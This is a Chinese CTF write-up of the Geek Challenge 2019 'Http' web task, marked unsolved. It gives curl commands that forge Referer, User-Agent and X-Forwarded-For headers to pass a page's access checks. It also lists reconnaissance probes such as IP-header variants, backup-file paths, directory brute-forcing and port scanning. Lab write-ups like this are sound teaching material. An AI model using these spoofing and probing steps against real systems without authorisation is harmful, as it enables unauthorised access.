---
title: 极客大挑战 2019 - Web - Http【未解决】
date: 2026-11-15 00:40:00
categories:
  - CTF
  - 极客大挑战 2019
  - Web
tags:
  - HTTP请求头伪造
  - Referer
  - User-Agent
  - X-Forwarded-For
cover: /img/cover/sword-girl-blue-sky.jpg
description: 极客大挑战 2019 的 HTTP 请求头伪造入门题，从首页源码隐藏链接进入 Secret.php，依次伪造 Referer、User-Agent 与本地 IP 三重校验；前两重已通过，第三重因 CTF2 环境缺陷无法绕过。
keywords:
  - Referer
  - User-Agent
  - X-Forwarded-For
  - HTTP头伪造
  - 极客大挑战
ai: >-
  本题是极客大挑战 2019 的 Web 基础题，考查 HTTP 请求头的伪造。查看首页源码可见正文末尾藏有指向 Secret.php 的隐藏链接。访问后服务器按三步逐层校验：先要求 Referer 来自指定域名，再要求 User-Agent 为 Syclover 浏览器，最后要求 X-Forwarded-For 为 127.0.0.1 以伪装本地访问。前两重校验可用 curl 的 -H 参数追加对应头轻松通过，但第三重本地 IP 校验在 CTF2 迁移环境中无法满足：原版 BUUCTF 依赖 nginx real_ip 模块把 X-Forwarded-For 写入 REMOTE_ADDR，而 CTF2 使用 openresty 反向代理且未配置 real_ip，导致后端 REMOTE_ADDR 恒为代理自身 IP，任何请求头都无法伪造为 127.0.0.1。已穷尽常见 IP 头与取值变体仍未获 flag，判为环境迁移缺陷。
copyright_author: Microsoft Xiaoice's
---

> 结论先行：首页源码藏 `Secret.php`，服务器依次校验 Referer、User-Agent、X-Forwarded-For 三个请求头。前两重已通过，第三重「本地 IP」校验因 CTF2 环境迁移缺陷（openresty 未配置 real_ip 模块）无法绕过，本题未解出 flag。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 极客大挑战 2019 |
| 方向 | Web |
| 难度 | 简单 |
| 状态 | 【未解决】 |
| 环境 | 授权靶场（已脱敏） |

知识点：HTTP 请求头伪造（Referer / User-Agent / X-Forwarded-For）。

## 信息收集

访问首页，查看源码，在正文末尾找到隐藏链接 `Secret.php`：

```html
<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>
```

## 漏洞分析

服务器把「请求来源、浏览器类型、客户端 IP」三个本应由服务端可信判断的条件，全部交给客户端可任意伪造的请求头，并按步提示、逐层放行。只要按顺序补齐三个头即可绕过，属于典型的「信任客户端输入」逻辑缺陷。

## 利用过程

### 1. 访问 Secret.php

直接访问 `Secret.php`，页面提示：

```text
It doesn't come from 'https://Sycsecret.buuoj.cn'
```

要求请求来源是 `https://Sycsecret.buuoj.cn`，即需伪造 `Referer` 头。

### 2. 伪造 Referer（✅ 通过）

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" http://TARGET/Secret.php
```

得到下一步提示：

```text
Please use "Syclover" browser
```

### 3. 伪造 User-Agent（✅ 通过）

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" \
     -H "User-Agent: Syclover" \
     http://TARGET/Secret.php
```

得到下一步提示：

```text
No!!! you can only read this locally!!!
```

### 4. 伪造本地 IP（❌ 无法绕过）

原版解法是追加 `X-Forwarded-For: 127.0.0.1` 让后端 `REMOTE_ADDR` 等于 127.0.0.1：

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" \
     -H "User-Agent: Syclover" \
     -H "X-Forwarded-For: 127.0.0.1" \
     http://TARGET/Secret.php
```

但 CTF2 迁移环境中该头（及所有常见变体）均无法通过本地 IP 校验，响应始终是 `No!!! you can only read this locally!!!`。

## 环境缺陷分析（未解决根因）

CTF2 迁移环境的服务器指纹为：

- `Server: openresty`
- `X-Powered-By: PHP/5.3.3`
- 响应 `Transfer-Encoding: chunked` + gzip（HTTP proxy_pass 特征）

原版 BUUCTF 的第三个条件依赖 nginx 的 `real_ip` 模块：`real_ip_header X-Forwarded-For` 会把客户端伪造的 `X-Forwarded-For` 写入 `REMOTE_ADDR`，从而通过 `$_SERVER['REMOTE_ADDR'] === '127.0.0.1'` 的本地检查。但 CTF2 的 openresty 反向代理**未配置 `real_ip` 模块**，后端 PHP 的 `REMOTE_ADDR` 恒等于 openresty 连接后端的固定 IP（非 127.0.0.1），任何 HTTP 请求头都无法改写它。

已系统穷尽的探测（均为已完成动作，结果一致失败，响应均为同一提示）：

| 探测手段 | 结果 |
|---|---|
| `X-Forwarded-For: 127.0.0.1` / `localhost` | ❌ 失败 |
| 19 个 IP 头名（`X-Real-IP`/`X-Client-IP`/`Client-IP`/`True-Client-IP`/`CF-Connecting-IP` 等）值 `127.0.0.1` | ❌ 全部失败 |
| 10 个 IP 头同时发送 | ❌ 失败 |
| 多值 XFF（`127.0.0.1, 1.2.3.4` / `1.2.3.4, 127.0.0.1`） | ❌ 失败 |
| XFF 值变体（`0.0.0.0`/`::1`/`127.1`/`2130706433`/带空格换行制表符） | ❌ 失败 |
| 改 `Host` 头为 `127.0.0.1`/`localhost` 等 | 返回 404（openresty 按 Host 路由） |
| 源码泄露路径（`.bak`/`.phps`/`.swp`/`www.zip`/`.git` 等 20+） | 全部 404 |
| 目录爆破 | 仅 `index.php` + `Secret.php`，无其他入口 |
| 端口扫描（21/80/81/443/2222/9999） | 无直连后端 PHP 路径 |

## 完整 EXP（原版预期，CTF2 环境失效）

```bash
curl -H "Referer: https://Sycsecret.buuoj.cn" \
     -H "User-Agent: Syclover" \
     -H "X-Forwarded-For: 127.0.0.1" \
     http://TARGET/Secret.php
```

## Flag

```
（未获取 —— 第三重本地 IP 校验因 CTF2 环境迁移缺陷无法绕过）
```

## 踩坑与总结

- HTTP 请求头伪造题按「来源 → 浏览器 → IP」逐层提示，一次补一个头，读响应提示即可知道下一步要伪造什么。
- 本地 IP 校验的可靠伪造依赖反向代理的 `real_ip` 配置；openresty 默认不开启该模块，此时 `REMOTE_ADDR` 无法被请求头改写，应识别为环境缺陷而非继续穷举头变体。
- 本题在 CTF2 迁移环境中无法解出，属环境迁移缺陷，已记录并标记【未解决】。
